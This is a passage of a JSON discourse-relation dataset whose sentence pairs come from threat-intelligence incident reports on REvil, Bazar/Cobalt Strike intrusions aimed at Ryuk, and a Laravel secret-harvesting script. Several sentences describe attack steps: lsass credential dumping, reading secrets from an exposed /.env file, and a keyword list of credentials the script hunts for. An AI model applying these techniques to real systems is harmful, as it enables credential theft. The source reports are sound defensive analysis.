        "relation": "MISC"
    },
    {
        "S1": "So basically the actors using REvil now can use it to reboot target machines into safe mode with networking\u2026@demonslay335 @VK_Intel pic.twitter.com/dLk4EirNFO \u2014 MalwareHunterTeam (@malwrhunterteam) March 18, 2021",
        "S2": "See below for -smode execution:",
        "relation": "ELABORATION"
    },
    {
        "S1": "See below for -smode execution:",
        "S2": "The *franceisshit key was used to boot the machine out of Safe Mode upon restarting the machine.",
        "relation": "MISC"
    },
    {
        "S1": "The *franceisshit key was used to boot the machine out of Safe Mode upon restarting the machine.",
        "S2": "The systems rebooted into Safe Mode with Networking after running this smode command and were left at a login screen.",
        "relation": "MISC"
    },
    {
        "S1": "The systems rebooted into Safe Mode with Networking after running this smode command and were left at a login screen.",
        "S2": "About 10-20 seconds after logging in, all user files were encrypted and a ransom note was placed in numerous locations including the Desktop.",
        "relation": "NEXT"
    },
    {
        "S1": "About 10-20 seconds after logging in, all user files were encrypted and a ransom note was placed in numerous locations including the Desktop.",
        "S2": "Services were not able to be started, which led to collection issues, as normal agents did not start.",
        "relation": "NEXT"
    },
    {
        "S1": "Services were not able to be started, which led to collection issues, as normal agents did not start.",
        "S2": "This also included the startup of EDR and management agents.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This also included the startup of EDR and management agents.",
        "S2": "We\u2019ve seen at least one tweet about smode setting auto login keys, but we did not see that in our case and were not able to recreate that situation.",
        "relation": "MISC"
    },
    {
        "S1": "We\u2019ve seen at least one tweet about smode setting auto login keys, but we did not see that in our case and were not able to recreate that situation.",
        "S2": "-smode switch configures OS to boot into safe mode w/ networking via:",
        "relation": "MISC"
    },
    {
        "S1": "-smode switch configures OS to boot into safe mode w/ networking via:",
        "S2": "configures auto",
        "relation": "LIST"
    },
    {
        "S1": "configures auto",
        "S2": "-lognn via WinLogon",
        "relation": "LIST"
    },
    {
        "S1": "-lognn via WinLogon",
        "S2": "\ud83d\udd11 w/ 'DTrump4ever' password \u2014 R3MRUM (@R3MRUM) March 26, 2021",
        "relation": "LIST"
    },
    {
        "S1": "\ud83d\udd11 w/ 'DTrump4ever' password \u2014 R3MRUM (@R3MRUM) March 26, 2021",
        "S2": "After rebooting out of Safe Mode, you are left with the following desktop:",
        "relation": "MISC"
    },
    {
        "S1": "After rebooting out of Safe Mode, you are left with the following desktop:",
        "S2": "On certain systems, like the domain controllers, the threat actors chose to not use the Safe Mode option, and instead they used a dll executed by rundll32 to encrypt the system with no reboot, allowing the threat actors to maintain access while the ransomware was encrypting files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On certain systems, like the domain controllers, the threat actors chose to not use the Safe Mode option, and instead they used a dll executed by rundll32 to encrypt the system with no reboot, allowing the threat actors to maintain access while the ransomware was encrypting files.",
        "S2": "The threat actors asked for 200k in Monero.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors asked for 200k in Monero.",
        "S2": "They were talked down 20-30% and could have been talked down more.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They were talked down 20-30% and could have been talked down more.",
        "S2": "Here\u2019s a few screenshots from the website.",
        "relation": "MISC"
    },
    {
        "S1": "Here\u2019s a few screenshots from the website.",
        "S2": "With the help of @hatching_io (https://tria.ge/) we were able to parse the config from the ransomware sample.",
        "relation": "MISC"
    },
    {
        "S1": "In this case we started with a DocuSign themed Excel maldoc.",
        "S2": "The excel file failed to bring down the payload but to follow the infection chain we executed the follow on loader.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The excel file failed to bring down the payload but to follow the infection chain we executed the follow on loader.",
        "S2": "Once Bazar was established the malware quickly injected into the Werfault process to avoid detection.",
        "relation": "MISC"
    },
    {
        "S1": "Once Bazar was established the malware quickly injected into the Werfault process to avoid detection.",
        "S2": "As seen in many intrusions the malware then performed some initial discovery with built-in Microsoft utilities such as Nltest.",
        "relation": "NEXT"
    },
    {
        "S1": "As seen in many intrusions the malware then performed some initial discovery with built-in Microsoft utilities such as Nltest.",
        "S2": "About an hour after initial execution, a Cobalt Strike beacon was loaded, followed shortly by Anchor.",
        "relation": "NEXT"
    },
    {
        "S1": "About an hour after initial execution, a Cobalt Strike beacon was loaded, followed shortly by Anchor.",
        "S2": "Shortly after Cobalt Strike and Anchor were running, the attackers dumped credentials and began moving laterally, starting with a domain controller.",
        "relation": "NEXT"
    },
    {
        "S1": "Shortly after Cobalt Strike and Anchor were running, the attackers dumped credentials and began moving laterally, starting with a domain controller.",
        "S2": "Once on the domain controller, the threat actors ran additional discovery but then went quiet.",
        "relation": "NEXT"
    },
    {
        "S1": "Once on the domain controller, the threat actors ran additional discovery but then went quiet.",
        "S2": "Active command and control was maintained by all three malware samples (Bazar, Cobalt Strike, Anchor DNS) over the next 4 days.",
        "relation": "MISC"
    },
    {
        "S1": "Active command and control was maintained by all three malware samples (Bazar, Cobalt Strike, Anchor DNS) over the next 4 days.",
        "S2": "During that timeframe, honey documents were interacted with and additional discovery scans were executed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During that timeframe, honey documents were interacted with and additional discovery scans were executed.",
        "S2": "The threat actors were briefly active on day 3 to execute their Get-DataInfo script to collect additional information, which is usually followed closely by Ryuk ransomware.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors were briefly active on day 3 to execute their Get-DataInfo script to collect additional information, which is usually followed closely by Ryuk ransomware.",
        "S2": "However, on the fifth day the threat actors access was cut off before final objectives could be accomplished.",
        "relation": "NEXT"
    },
    {
        "S1": "However, on the fifth day the threat actors access was cut off before final objectives could be accomplished.",
        "S2": "We assess that the end goal of this intrusion was to execute domain wide ransomware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We assess that the end goal of this intrusion was to execute domain wide ransomware.",
        "S2": "A DocuSign themed Excel xls was opened and macros were enabled.",
        "relation": "MISC"
    },
    {
        "S1": "A DocuSign themed Excel xls was opened and macros were enabled.",
        "S2": "Thanks to @ffforward for the document as well as the sandbox run leading up to the xls file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Thanks to @ffforward for the document as well as the sandbox run leading up to the xls file.",
        "S2": "The macro in this maldoc is using Excel 4 Macros.",
        "relation": "MISC"
    },
    {
        "S1": "The macro in this maldoc is using Excel 4 Macros.",
        "S2": "DocuSign was again the social engineering format of choice.",
        "relation": "MISC"
    },
    {
        "S1": "DocuSign was again the social engineering format of choice.",
        "S2": "After execution, Excel called out to:",
        "relation": "MISC"
    },
    {
        "S1": "After execution, Excel called out to:",
        "S2": "We saw no further follow on activity from the above execution, potentiality due to the loader site being offline or some other condition not being met.",
        "relation": "MISC"
    },
    {
        "S1": "We saw no further follow on activity from the above execution, potentiality due to the loader site being offline or some other condition not being met.",
        "S2": "We then executed the follow on malware manually.",
        "relation": "MISC"
    },
    {
        "S1": "We then executed the follow on malware manually.",
        "S2": "About an hour after execution of the above Bazar Loader, Cobalt Strike was executed by the injected Werfault process.",
        "relation": "MISC"
    },
    {
        "S1": "About an hour after execution of the above Bazar Loader, Cobalt Strike was executed by the injected Werfault process.",
        "S2": "Shortly after Cobalt Strike was executed, it dropped several Anchor executable files.",
        "relation": "NEXT"
    },
    {
        "S1": "Shortly after Cobalt Strike was executed, it dropped several Anchor executable files.",
        "S2": "AnchorDns was then executed via Cobalt Strike which called cmd and then anchorAsjuster.",
        "relation": "NEXT"
    },
    {
        "S1": "AnchorDns was then executed via Cobalt Strike which called cmd and then anchorAsjuster.",
        "S2": "Notice Asjuster passing two domains to anchor_x64.exe which will be used for C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Notice Asjuster passing two domains to anchor_x64.exe which will be used for C2.",
        "S2": "Bazar quickly moved into a Werfault process to handle command and control communication avoiding making any network connections directly.",
        "relation": "MISC"
    },
    {
        "S1": "Bazar quickly moved into a Werfault process to handle command and control communication avoiding making any network connections directly.",
        "S2": "Process injection was also seen in other key system executables such as winlogon.exe.",
        "relation": "LIST"
    },
    {
        "S1": "Process injection was also seen in other key system executables such as winlogon.exe.",
        "S2": "Cobalt Strike was seen locking access to SMB beacons.",
        "relation": "LIST"
    },
    {
        "S1": "Cobalt Strike was seen locking access to SMB beacons.",
        "S2": "Anchor was also seen triggering process tampering.",
        "relation": "LIST"
    },
    {
        "S1": "Anchor was also seen triggering process tampering.",
        "S2": "The threat actors were seen using remote thread creation to inject into lsass to extract credentials.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors were seen using remote thread creation to inject into lsass to extract credentials.",
        "S2": "The same activity as seen via a the larger process tree.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The same activity as seen via a the larger process tree.",
        "S2": "Bazar initiated some discovery activity within 10 minutes of executing.",
        "relation": "MISC"
    },
    {
        "S1": "Bazar initiated some discovery activity within 10 minutes of executing.",
        "S2": "Cobalt Strike initiated the following discovery commands:",
        "relation": "LIST"
    },
    {
        "S1": "Cobalt Strike initiated the following discovery commands:",
        "S2": "On the domain controller the following discovery was run:",
        "relation": "LIST"
    },
    {
        "S1": "On the domain controller the following discovery was run:",
        "S2": "The following PowerShell command was executed from the domain controller.",
        "relation": "LIST"
    },
    {
        "S1": "The following PowerShell command was executed from the domain controller.",
        "S2": "Systems were pinged from the domain controller to confirm connectivity.",
        "relation": "LIST"
    },
    {
        "S1": "Systems were pinged from the domain controller to confirm connectivity.",
        "S2": "Four days into the intrusion the threat actors dropped and executed Advanced_IP_Scanner_2.5.3850.exe which kicked off a scan of the network.",
        "relation": "MISC"
    },
    {
        "S1": "Four days into the intrusion the threat actors dropped and executed Advanced_IP_Scanner_2.5.3850.exe which kicked off a scan of the network.",
        "S2": "AWS was used to get the public IP of the infected machine, multiple times.",
        "relation": "MISC"
    },
    {
        "S1": "AWS was used to get the public IP of the infected machine, multiple times.",
        "S2": "Minutes before deployment of Ryuk the threat actors usually drop the following files, usually on a domain controller.",
        "relation": "MISC"
    },
    {
        "S1": "Minutes before deployment of Ryuk the threat actors usually drop the following files, usually on a domain controller.",
        "S2": "This time they dropped the files on a domain controller in C:\\info",
        "relation": "ELABORATION"
    },
    {
        "S1": "This time they dropped the files on a domain controller in C:\\info",
        "S2": "The exact files were mentioned in our Bazar, No Ryuk report.",
        "relation": "MISC"
    },
    {
        "S1": "The exact files were mentioned in our Bazar, No Ryuk report.",
        "S2": "start.bat was executed with the following:",
        "relation": "MISC"
    },
    {
        "S1": "start.bat was executed with the following:",
        "S2": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\info\\start.bat\"\"",
        "relation": "ELABORATION"
    },
    {
        "S1": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\info\\start.bat\"\"",
        "S2": "This script contents show it to be a wrapper for the PowerShell script Get-DataInfo.ps1 The contents of Get-DataInfo.ps1 show a detailed information collector to provide the threat actor with very specific details of the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This script contents show it to be a wrapper for the PowerShell script Get-DataInfo.ps1 The contents of Get-DataInfo.ps1 show a detailed information collector to provide the threat actor with very specific details of the environment.",
        "S2": "This includes things like disk size, connectivity, antivirus software, and backup software.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This includes things like disk size, connectivity, antivirus software, and backup software.",
        "S2": "The Ryuk group has used this script for at least a year as we\u2019ve seen them use it multiple times.",
        "relation": "MISC"
    },
    {
        "S1": "The Ryuk group has used this script for at least a year as we\u2019ve seen them use it multiple times.",
        "S2": "This script and files are available @ https://thedfirreport.com/services/",
        "relation": "ELABORATION"
    },
    {
        "S1": "This script and files are available @ https://thedfirreport.com/services/",
        "S2": "Two hours post initial access the threat actors began lateral movement to one of the domain controllers using PowerShell, which was executed via a remote service, which launched Cobalt Strike",
        "relation": "MISC"
    },
    {
        "S1": "Two hours post initial access the threat actors began lateral movement to one of the domain controllers using PowerShell, which was executed via a remote service, which launched Cobalt Strike",
        "S2": "Reviewing the PowerShell script we can extract the shellcode and run it through scdbg to find the pipe used by the beacon.",
        "relation": "MISC"
    },
    {
        "S1": "Reviewing the PowerShell script we can extract the shellcode and run it through scdbg to find the pipe used by the beacon.",
        "S2": "Thanks to 0xtornado and @mattnotmax for this recipe!",
        "relation": "MISC"
    },
    {
        "S1": "Thanks to 0xtornado and @mattnotmax for this recipe!",
        "S2": "The threat actors also used SMB beacons executed by remote services as well.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors also used SMB beacons executed by remote services as well.",
        "S2": "We saw this across most machines in the domain.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We saw this across most machines in the domain.",
        "S2": "The threat actors also used RDP to login to multiple machines within the domain.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors also used RDP to login to multiple machines within the domain.",
        "S2": "We did not witness collection events but we do believe files were collected and exfiltrated over encrypted C2 channels.",
        "relation": "MISC"
    },
    {
        "S1": "We did not witness collection events but we do believe files were collected and exfiltrated over encrypted C2 channels.",
        "S2": "We observed the Bazar malware inject into a WerFault process to perform ongoing command and control communication.",
        "relation": "MISC"
    },
    {
        "S1": "We observed the Bazar malware inject into a WerFault process to perform ongoing command and control communication.",
        "S2": "The AnchorDNS malware performed C2 over DNS to the following domains:",
        "relation": "MISC"
    },
    {
        "S1": "The AnchorDNS malware performed C2 over DNS to the following domains:",
        "S2": "No exfiltration was observed but honey docs were taken off network and opened by the threat actors from remote locations.",
        "relation": "MISC"
    },
    {
        "S1": "No exfiltration was observed but honey docs were taken off network and opened by the threat actors from remote locations.",
        "S2": "We assess that this exfiltration was performed over an encrypted C2 channel.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We assess that this exfiltration was performed over an encrypted C2 channel.",
        "S2": "This exfiltration has been going on for months and is rarely talked about when it comes to Wizard Spider.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This exfiltration has been going on for months and is rarely talked about when it comes to Wizard Spider.",
        "S2": "We believe this intrusion would have ended with domain wide ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "We believe this intrusion would have ended with domain wide ransomware.",
        "S2": "The deployment of the Get-DataInfo.ps1 script and overall TTP\u2019s used in the intrustion are consistent with threat actors associated with deployments of the Ryuk ransomware family.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The deployment of the Get-DataInfo.ps1 script and overall TTP\u2019s used in the intrustion are consistent with threat actors associated with deployments of the Ryuk ransomware family.",
        "S2": "Enjoy our report?",
        "relation": "MISC"
    },
    {
        "S1": "Enjoy our report?",
        "S2": "Please consider donating $1 or more using Patreon.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Please consider donating $1 or more using Patreon.",
        "S2": "Thank you for your support!",
        "relation": "ELABORATION"
    },
    {
        "S1": "Thank you for your support!",
        "S2": "We also have pcaps, memory captures, scripts, executables, and Kape packages available here",
        "relation": "MISC"
    },
    {
        "S1": "An attacker logged in through RDP a few days ago to run a \u201csmtp cracker\u201d that scans a list of IP addresses or URLs looking for misconfigured Laravel systems.",
        "S2": "These attackers are looking for websites that have debug mode enabled, which allows the attacker to see their .env (config) file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These attackers are looking for websites that have debug mode enabled, which allows the attacker to see their .env (config) file.",
        "S2": "The .env file includes AWS, O365, SendGrid, Twilio credentials and more.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The .env file includes AWS, O365, SendGrid, Twilio credentials and more.",
        "S2": "What is Laravel?",
        "relation": "MISC"
    },
    {
        "S1": "What is Laravel?",
        "S2": "Laravel is a free, open-source[3] PHP web framework, created by Taylor Otwell and intended for the development of web applications https://en.wikipedia.org/wiki/Laravel",
        "relation": "ELABORATION"
    },
    {
        "S1": "Laravel is a free, open-source[3] PHP web framework, created by Taylor Otwell and intended for the development of web applications https://en.wikipedia.org/wiki/Laravel",
        "S2": "Laravel provides drivers for SMTP, Mailgun, Mandrill, Amazon SES, PHP\u2019s mail function, and sendmail, allowing you to quickly get started sending mail through a local or cloud based service of your choice.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Laravel provides drivers for SMTP, Mailgun, Mandrill, Amazon SES, PHP\u2019s mail function, and sendmail, allowing you to quickly get started sending mail through a local or cloud based service of your choice.",
        "S2": "https://laravel.com/docs/5.1/mail",
        "relation": "MISC"
    },
    {
        "S1": "https://laravel.com/docs/5.1/mail",
        "S2": "The debug option is turned off by default on Laravel systems, but it appears many users are enabling debug and not understanding the consequences.",
        "relation": "MISC"
    },
    {
        "S1": "The debug option is turned off by default on Laravel systems, but it appears many users are enabling debug and not understanding the consequences.",
        "S2": "Here\u2019s an example of debug being enabled (set to true) in the .env config file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here\u2019s an example of debug being enabled (set to true) in the .env config file.",
        "S2": "web response (not actual config file)",
        "relation": "MISC"
    },
    {
        "S1": "web response (not actual config file)",
        "S2": "You can check to see if debug is enabled by checking for .env in the web root (site.com/.env) or by sending random data to the webserver and reviewing the response.",
        "relation": "MISC"
    },
    {
        "S1": "You can check to see if debug is enabled by checking for .env in the web root (site.com/.env) or by sending random data to the webserver and reviewing the response.",
        "S2": "In the response, you will see the debug option as well as all the information from the .env file, which includes the secrets.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the response, you will see the debug option as well as all the information from the .env file, which includes the secrets.",
        "S2": "Here\u2019s an example of a web response with debug enabled:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here\u2019s an example of a web response with debug enabled:",
        "S2": "Here\u2019s an example of an .env file:",
        "relation": "LIST"
    },
    {
        "S1": "Here\u2019s an example of an .env file:",
        "S2": "The \u201csmtp cracker\u201d script, which by the way\u2013is not a cracker, and grabs more than just smtp credentials",
        "relation": "MISC"
    },
    {
        "S1": "The \u201csmtp cracker\u201d script, which by the way\u2013is not a cracker, and grabs more than just smtp credentials",
        "S2": "; it uses the above methods to crawl a list of IPs/URLs looking for specific strings in the response such as PayPal, AWS_KEY, SES_KEY, Twilio, sendgrid, office365, zoho, mailgun and others.",
        "relation": "ELABORATION"
    },
    {
        "S1": "; it uses the above methods to crawl a list of IPs/URLs looking for specific strings in the response such as PayPal, AWS_KEY, SES_KEY, Twilio, sendgrid, office365, zoho, mailgun and others.",
        "S2": "Here\u2019s part of the script, where it looks for a string in mailhost and outputs the secret(s) to the appropriate file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here\u2019s part of the script, where it looks for a string in mailhost and outputs the secret(s) to the appropriate file.",
        "S2": "The output of the script is saved in a folder named Results.",
        "relation": "NEXT"
    },
    {
        "S1": "The output of the script is saved in a folder named Results.",
        "S2": "The results are divided into groups as seen above.",
        "relation": "NEXT"
    },
    {
        "S1": "The results are divided into groups as seen above.",
        "S2": "Inside those files contain the secrets and method used to extract the information.",
        "relation": "MISC"
    },
    {
        "S1": "Inside those files contain the secrets and method used to extract the information.",
        "S2": "This is a partial example of the sendgrid file:",
        "relation": "MISC"
    },
    {
        "S1": "This is a partial example of the sendgrid file:",
        "S2": "This is a partial example of the office365 text file:",
        "relation": "LIST"
    },
    {
        "S1": "This is a partial example of the office365 text file:",
        "S2": "We are in the process of contacting over 100 people/organizations who\u2019s systems are leaking secrets via Laravel debug in hopes that they will remediate the issue and change their passwords.",
        "relation": "MISC"
    },
    {
        "S1": "We are in the process of contacting over 100 people/organizations who\u2019s systems are leaking secrets via Laravel debug in hopes that they will remediate the issue and change their passwords.",
        "S2": "If anyone needs help fixing this issue, please use the Contact Us form to get in touch.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If anyone needs help fixing this issue, please use the Contact Us form to get in touch.",
        "S2": "RDP login as local admin from 64.86.198[.]22.",
        "relation": "MISC"
    },
    {
        "S1": "RDP login as local admin from 64.86.198[.]22.",
        "S2": "No brute force attempts were seen from this IP.",
        "relation": "MISC"
    },
    {
        "S1": "No brute force attempts were seen from this IP.",
        "S2": "The attacker installed and used Python 2.7 to execute the smtp cracker script.",
        "relation": "MISC"
    },
    {
        "S1": "The attacker installed and used Python 2.7 to execute the smtp cracker script.",
        "S2": "Pip was used to install 4 modules.",
        "relation": "MISC"
    },
    {
        "S1": "This investigation began as many do, with a malicious document delivered via email.",
        "S2": "The email and accompanying Excel file purported to be a DocuSign request, which entices the user to enable macros.",
        "relation": "NEXT"
    },
    {
        "S1": "The email and accompanying Excel file purported to be a DocuSign request, which entices the user to enable macros.",
        "S2": "This lead to Bazar being dropped on the system, which created a run key for persistence.",
        "relation": "NEXT"
    },
    {
        "S1": "This lead to Bazar being dropped on the system, which created a run key for persistence.",
        "S2": "On the first day, after the initial activity, nothing else was seen.",
        "relation": "NEXT"
    },
    {
        "S1": "On the first day, after the initial activity, nothing else was seen.",
        "S2": "On the second day, we observed DNS requests to .bazar domain names (the hallmark of the Bazar malware family).",
        "relation": "NEXT"
    },
    {
        "S1": "On the second day, we observed DNS requests to .bazar domain names (the hallmark of the Bazar malware family).",
        "S2": "The malware also executed some basic nltest domain discovery, and a short ping to a Cobalt Strike server, but no additional activity was observed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware also executed some basic nltest domain discovery, and a short ping to a Cobalt Strike server, but no additional activity was observed.",
        "S2": "On the third day, more communication was observed between the Bazar and Cobalt Strike infrastructure, but again, no downloads or follow-on activity was observed.",
        "relation": "NEXT"
    },
    {
        "S1": "On the third day, more communication was observed between the Bazar and Cobalt Strike infrastructure, but again, no downloads or follow-on activity was observed.",
        "S2": "On the fourth day, Bazar pulled down a Cobalt Strike Beacon in the form of a DLL, which was executed via rundll32 and injected into various system processes.",
        "relation": "NEXT"
    },
    {
        "S1": "On the fourth day, Bazar pulled down a Cobalt Strike Beacon in the form of a DLL, which was executed via rundll32 and injected into various system processes.",
        "S2": "One of those processes injected into, was dllhost, which then ran various PowerSploit commands for discovery activity and dumped credentials from lsass.",
        "relation": "ELABORATION"
    },
    {
        "S1": "One of those processes injected into, was dllhost, which then ran various PowerSploit commands for discovery activity and dumped credentials from lsass.",
        "S2": "Shortly thereafter, the threat actors began moving laterally using multiple techniques, such as:",
        "relation": "NEXT"
    },
    {
        "S1": "Shortly thereafter, the threat actors began moving laterally using multiple techniques, such as:",
        "S2": "- Pass the Hash",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Pass the Hash",
        "S2": "- SMB executable transfer and exec",
        "relation": "LIST"
    },
    {
        "S1": "- SMB executable transfer and exec",
        "S2": "- RDP",
        "relation": "LIST"
    },
    {
        "S1": "- RDP",
        "S2": "- Remote service execution",
        "relation": "LIST"
    },
    {
        "S1": "- Remote service execution",
        "S2": "The threat actors then continued pivoting and collecting more information about the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors then continued pivoting and collecting more information about the environment.",
        "S2": "About an hour after beginning their lateral movement, they had compromised a domain controller.",
        "relation": "NEXT"
    },
    {
        "S1": "About an hour after beginning their lateral movement, they had compromised a domain controller.",
        "S2": "On that domain controller, they executed AdFind, and then dropped a custom PowerShell script named Get-DataInfo.ps1.",
        "relation": "NEXT"
    },
    {
        "S1": "On that domain controller, they executed AdFind, and then dropped a custom PowerShell script named Get-DataInfo.ps1.",
        "S2": "This script looks for all active machines and queries installed software, i.e., backup software, security software, etc.",
        "relation": "NEXT"
    },
    {
        "S1": "This script looks for all active machines and queries installed software, i.e., backup software, security software, etc.",
        "S2": "We first saw this script about a year ago when threat actors deployed Ryuk ransomware across a domain.",
        "relation": "MISC"
    },
    {
        "S1": "We first saw this script about a year ago when threat actors deployed Ryuk ransomware across a domain.",
        "S2": "Other public data has also linked this TTP to Ryuk threat actors.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Other public data has also linked this TTP to Ryuk threat actors.",
        "S2": "However, in this case, about 15 minutes after running the script, the threat actor dropped their access and left the environment.",
        "relation": "MISC"
    },
    {
        "S1": "However, in this case, about 15 minutes after running the script, the threat actor dropped their access and left the environment.",
        "S2": "We do not know what caused them to leave, but we have some ideas.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We do not know what caused them to leave, but we have some ideas.",
        "S2": "Based on the TTP\u2019s of this intrusion, we assess, with medium to high confidence, that Ryuk would have been the likely ransomware deployed.",
        "relation": "MISC"
    },
    {
        "S1": "Based on the TTP\u2019s of this intrusion, we assess, with medium to high confidence, that Ryuk would have been the likely ransomware deployed.",
        "S2": "Total time in the environment was around 4 days.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Total time in the environment was around 4 days.",
        "S2": "We recently started offering intel feeds based on different command and control infrastructure such as Cobalt Strike, Qbot, Trickbot, PoshC2, PS Empire, etc. and this feed would have alerted on the Cobalt Strike C2 in this case.",
        "relation": "MISC"
    },
    {
        "S1": "We recently started offering intel feeds based on different command and control infrastructure such as Cobalt Strike, Qbot, Trickbot, PoshC2, PS Empire, etc. and this feed would have alerted on the Cobalt Strike C2 in this case.",
        "S2": "If you\u2019re interested in pricing or interested in a trial please use Contact Us to get in touch.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If you\u2019re interested in pricing or interested in a trial please use Contact Us to get in touch.",
        "S2": "Initial access to the environment was via a malicious email that entices a user to download an Excel document with macros using a DocuSign social engineering theme.",
        "relation": "MISC"
    },
    {
        "S1": "Initial access to the environment was via a malicious email that entices a user to download an Excel document with macros using a DocuSign social engineering theme.",
        "S2": "The Excel document required the user to enable content to execute.",
        "relation": "NEXT"
    },
    {
        "S1": "The Excel document required the user to enable content to execute.",
        "S2": "The embedded macro in the file was using an Excel 4.0 macro, which at time of execution had a detection rate of 1/63 in Virustotal.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The embedded macro in the file was using an Excel 4.0 macro, which at time of execution had a detection rate of 1/63 in Virustotal.",
        "S2": "Upon execution of the macro the file reached out to:",
        "relation": "NEXT"
    },
    {
        "S1": "Upon execution of the macro the file reached out to:",
        "S2": "As seen in the contents of the macro below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "As seen in the contents of the macro below:",
        "S2": "From there a file was written:",
        "relation": "MISC"
    },
    {
        "S1": "From there a file was written:",
        "S2": "From here the executable then proceeds to create a new file and execute it via cmd.",
        "relation": "NEXT"
    },
    {
        "S1": "From here the executable then proceeds to create a new file and execute it via cmd.",
        "S2": "Four days post initial access, a Cobalt Strike Beacon was executed via rundll32 and cmd.",
        "relation": "NEXT"
    },
    {
        "S1": "Four days post initial access, a Cobalt Strike Beacon was executed via rundll32 and cmd.",
        "S2": "Immediately following the execution of M1E1626.exe, a persistence mechanism was created for the file using a run key.",
        "relation": "MISC"
    },
    {
        "S1": "Immediately following the execution of M1E1626.exe, a persistence mechanism was created for the file using a run key.",
        "S2": "This file was found to be a BazarBackdoor sample.",
        "relation": "MISC"
    },
    {
        "S1": "This file was found to be a BazarBackdoor sample.",
        "S2": "The use of the Cobalt Strike\u2019s piped privilege escalation (Get-System) was used several times during the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The use of the Cobalt Strike\u2019s piped privilege escalation (Get-System) was used several times during the intrusion.",
        "S2": "After loading the Cobalt Strike DLL, there was an almost instant injection by the process into the Werfault process.",
        "relation": "NEXT"
    },
    {
        "S1": "After loading the Cobalt Strike DLL, there was an almost instant injection by the process into the Werfault process.",
        "S2": "We also see the Cobalt Strike Beacon running in the dllhost.exe process, loading PowerShell to perform PowerSploit commands in the discovery section.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We also see the Cobalt Strike Beacon running in the dllhost.exe process, loading PowerShell to perform PowerSploit commands in the discovery section.",
        "S2": "Additionally via the use of YARA inspection we found Cobalt Strike running or injected into processes across the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Additionally via the use of YARA inspection we found Cobalt Strike running or injected into processes across the environment.",
        "S2": "Lsass was dumped using Cobalt Strike on multiple occasions.",
        "relation": "MISC"
    },
    {
        "S1": "Lsass was dumped using Cobalt Strike on multiple occasions.",
        "S2": "We were not able to recover any proof other than parent/child processes.",
        "relation": "MISC"
    },
    {
        "S1": "We were not able to recover any proof other than parent/child processes.",
        "S2": "A day after initial access, Bazar initiated some discovery activity using Nltest:",
        "relation": "MISC"
    },
    {
        "S1": "A day after initial access, Bazar initiated some discovery activity using Nltest:",
        "S2": "On the forth day, a Cobalt Strike Beacon was executed and then the following discovery commands were executed.",
        "relation": "NEXT"
    },
    {
        "S1": "On the forth day, a Cobalt Strike Beacon was executed and then the following discovery commands were executed.",
        "S2": "On the initial beachhead host, we also saw the Cobalt Strike Beacon initiate the following PowerShell discovery using Powersploit:",
        "relation": "MISC"
    },
    {
        "S1": "On the initial beachhead host, we also saw the Cobalt Strike Beacon initiate the following PowerShell discovery using Powersploit:",
        "S2": "After beginning lateral movement, the threat actors used the following Window\u2019s utilities for system profiling:",
        "relation": "MISC"
    },
    {
        "S1": "After beginning lateral movement, the threat actors used the following Window\u2019s utilities for system profiling:",
        "S2": "Once the threat actors had access to a domain controller, they ran the following PowerShell discovery:",
        "relation": "MISC"
    },
    {
        "S1": "Once the threat actors had access to a domain controller, they ran the following PowerShell discovery:",
        "S2": "After running that, the threat actors used nltest again to confirm domain trusts:",
        "relation": "NEXT"
    },
    {
        "S1": "After running that, the threat actors used nltest again to confirm domain trusts:",
        "S2": "The local time was also queried on the domain controller:",
        "relation": "NEXT"
    },
    {
        "S1": "The local time was also queried on the domain controller:",
        "S2": "AdFind was executed using adf.bat:",
        "relation": "NEXT"
    },
    {
        "S1": "AdFind was executed using adf.bat:",
        "S2": "Finally, the following collection of files were dropped on the domain controller:",
        "relation": "NEXT"
    },
    {
        "S1": "Finally, the following collection of files were dropped on the domain controller:",
        "S2": "C:\\Users\\USER\\Desktop\\info\\start.bat start.bat was executed with the following: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\USER\\Desktop\\info\\start.bat\"\"",
        "relation": "NEXT"
    },
    {
        "S1": "C:\\Users\\USER\\Desktop\\info\\start.bat start.bat was executed with the following: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\USER\\Desktop\\info\\start.bat\"\"",
